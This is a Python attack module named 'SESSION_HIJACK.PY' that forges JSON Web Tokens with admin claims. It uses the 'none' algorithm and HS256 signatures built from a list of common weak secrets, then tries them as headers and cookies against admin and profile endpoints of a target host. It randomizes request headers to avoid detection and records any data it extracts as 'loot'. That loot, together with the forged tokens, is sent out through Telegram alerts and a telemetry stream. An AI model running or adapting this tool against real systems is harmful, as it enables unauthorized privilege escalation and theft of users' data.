#!/usr/bin/env python3
"""
SESSION_HIJACK.PY v8.8 — Session Forging & Privilege Escalation Module
"""
import asyncio
import base64
import hashlib
import hmac
import json
import sys
from urllib.parse import urlsplit

import httpx

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

COMMON_SECRETS = [
    "secret", "password", "jwt_secret", "changeme", "admin123",
    "supersecret", "123456", "token", "api_key", "laravel",
    "app_key", "app_secret", "secretkey", "production",
    "jwt_signing_key", "auth_secret", "default_secret",
]

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "GRAY": "\033[90m",
    "RESET": "\033[0m",
}

HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session",
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "hijack", "privilege",
]

CHALLENGE_OR_LOGIN_MARKERS = (
    '<div id="root"></div>',
    '<div id="__next"></div>',
    '<div id="__nuxt"></div>',
    "<title>security check</title>",
    "cf-browser-verification",
    "attention required!",
    "just a moment...",
    "login-form",
    "sign in",
    "log in",
)

_background_tasks: set[asyncio.Task] = set()


def log(msg, color="GREEN"):
    ansi_color = COLORS.get(color, color)
    sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
    sys.stdout.flush()


def _is_challenge_or_shell(body: str, headers: dict) -> bool:
    text = body or ""
    lower = text.lower()
    ctype = str((headers or {}).get("content-type", "")).lower()

    if any(m in lower for m in CHALLENGE_OR_LOGIN_MARKERS):
        return True
    if "application/json" not in ctype and "<html" in lower and len(text) > 800:
        return True
    return False


async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await asyncio.wait_for(
                send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details),
                timeout=8,
            )
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts for verified findings."""
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return

        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def sign_hs256(header_payload_str, secret):
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    signature = hmac.new(secret, header_payload_str.encode("utf-8"), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(signature).rstrip(b"=").decode("utf-8")


async def establish_baseline(client, base_url, endpoints):
    baselines = {}
    for endpoint in endpoints:
        try:
            resp = await client.get(f"{base_url}{endpoint}", headers=get_randomized_hints())
            baselines[endpoint] = {
                "status": resp.status_code,
                "length": len(resp.text or ""),
                "text": (resp.text or "")[:500],
            }
        except Exception:
            pass
    return baselines


async def fetch_jwks_public_key(client, base_url):
    jwks_paths = ["/.well-known/jwks.json", "/api/jwks.json", "/oauth/jwks.json"]
    for path in jwks_paths:
        try:
            resp = await client.get(f"{base_url}{path}", headers=get_randomized_hints())
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and ("keys" in data or "n" in data):
                    return resp.text
        except Exception:
            pass
    return None


async def run_session_hijack(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING SESSION HIJACKING & TOKEN FORGING MODULE (V8.8 HARDENED) [***]", "MAGENTA")
    apply_behavioral_jitter()

    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"

    hijack_findings = []
    target_endpoints = [
        "/admin",
        "/dashboard",
        "/api/admin",
        "/api/user/profile",
        "/api/v1/user/profile",
        "/api/settings",
    ]

    secrets_pool = list(dict.fromkeys(COMMON_SECRETS))

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=6.0) as client:
        baselines = await establish_baseline(client, base_url, target_endpoints)

        jwks_content = await fetch_jwks_public_key(client, base_url)
        if jwks_content and jwks_content not in secrets_pool:
            secrets_pool.append(jwks_content)

        header_none = base64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
        payload_data = {
            "user": "admin",
            "role": "superuser",
            "isAdmin": True,
            "sub": "admin_bypass",
            "permissions": ["all"],
        }
        payload = base64url_encode(json.dumps(payload_data))
        forged_jwt_none = f"{header_none}.{payload}."

        header_hs = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
        header_payload_str = f"{header_hs}.{payload}"

        tokens_to_test = [("None Algorithm Bypass", forged_jwt_none)]
        for secret in secrets_pool:
            sig = sign_hs256(header_payload_str, secret)
            tokens_to_test.append((f"HMAC Secret [{str(secret)[:12]}...]", f"{header_payload_str}.{sig}"))

        for vector_name, token in tokens_to_test:
            if not token:
                continue
            for endpoint in target_endpoints:
                url = f"{base_url}{endpoint}"
                random_hints = get_randomized_hints()
                headers_variants = [
                    {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", **random_hints},
                    {"X-Access-Token": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", **random_hints},
                ]
                cookies_variant = {"token": token, "session": token, "jwt": token, "access_token": token}

                verified_on_endpoint = False
                for headers in headers_variants:
                    try:
                        response = await client.get(url, headers=headers, cookies=cookies_variant)
                        status = response.status_code
                        body = response.text or ""
                        resp_headers = dict(response.headers)

                        if status != 200 or _is_challenge_or_shell(body, resp_headers):
                            continue

                        baseline = baselines.get(endpoint, {"status": 404, "length": 0})
                        is_differential_match = abs(len(body) - baseline["length"]) > 100

                        has_elevated_json = False
                        extracted_json_data = {}
                        try:
                            json_data = response.json()
                            if isinstance(json_data, dict):
                                extracted_json_data = json_data
                                if any(
                                    k in json_data
                                    for k in (
                                        "users",
                                        "admin",
                                        "balance",
                                        "transactions",
                                        "secret_key",
                                        "config",
                                        "role",
                                        "permissions",
                                        "user_id",
                                    )
                                ):
                                    has_elevated_json = True
                        except Exception:
                            pass

                        if has_elevated_json or (is_differential_match and extracted_json_data):
                            log(f"[!!!] VERIFIED SESSION ACCESS AT {endpoint} USING {vector_name} [!!!]", "RED")
                            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                            loot_payload = {
                                "vector": vector_name,
                                "endpoint": endpoint,
                                "status": status,
                                "forged_token": token,
                                "integrity_hash": loot_hash,
                                "extracted_data": extracted_json_data or body[:400],
                            }

                            broadcast_tg_alert_sync(f"Verified Session Hijack ({vector_name})", loot_payload)
                            stream_proof(
                                "SESSION_HIJACK_BREACH",
                                endpoint,
                                {"vector": vector_name, "token": token},
                                body,
                                extracted_json_data or {"status": status},
                            )
                            save_session_loot(
                                target=base_url,
                                endpoint=endpoint,
                                finding_type=f"SESSION_HIJACK_{vector_name.replace(' ', '_').upper()}",
                                status=status,
                                headers=resp_headers,
                                body=body,
                                extra_loot=loot_payload,
                            )

                            hijack_findings.append({
                                "vector": vector_name,
                                "endpoint": endpoint,
                                "forged_token": token,
                                "status": "VERIFIED_ACCESS",
                                "integrity_hash": loot_hash,
                                "response_snippet": body[:300],
                            })
                            verified_on_endpoint = True
                            break
                    except Exception:
                        pass

                if verified_on_endpoint:
                    break

    if not hijack_findings:
        log("[-] Session hijacking audit complete. Zero unverified or challenge false positives.", "YELLOW")
    else:
        log(f"[+] Confirmed and validated {len(hijack_findings)} genuine session bypass vulnerabilities!", "GREEN")

    return hijack_findings


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.invalid"
    asyncio.run(run_session_hijack(target))
